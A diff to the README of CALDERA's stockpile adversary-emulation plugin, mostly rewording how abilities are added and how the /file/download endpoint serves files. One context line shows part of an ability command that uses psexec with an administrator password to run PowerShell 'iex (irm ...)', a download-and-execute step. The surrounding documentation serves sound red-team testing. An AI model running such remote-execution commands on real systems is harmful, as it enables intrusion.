@@ -7,17 +7,15 @@ This plugin contains:
 * A filestore
 * A basic planner 
 
-You can quickly add your own abilities and adversaries to the stockpile, both of which are reloaded every time
-the core server reboots.
-
 ## Abilities
 
-Stockpile abilities are located in the abilities/ directory.
+You can quickly add your own abilities and adversaries to the stockpile, both of which are reloaded every time
+the core server reboots. Stockpile abilities are located in the abilities/ directory.
 
 To add new ones, add a .yml file in the abilities directory, named after a unique ID (UUID-4 is our standard). 
 This file should include an ID, name, description, ATT&CK tactic and command.
 
-Below is an example ability
+Below is an example ability. Read this carefully, it will be referenced later on.
 ```
 - id: e9bcdf0d-be08-4aec-bf1e-e73655403d55
   name: Download WIFI tools
@@ -57,7 +55,7 @@ psexec \\127.0.0.1 -u administrator -p password123 Powershell.exe iex (irm -Meth
 In the ability example, note the command downloading the wifi.sh file from CALDERA. It does this by sending a
 POST request to the API endpoint /file/download, including the requested filename as a header.
 
-The /file/download endpoint will look inside the filestore directory of every plugin when called.
+The /file/download endpoint will look inside the filestore directory of every loaded plugin when called.
 
 ### Cleanup
 
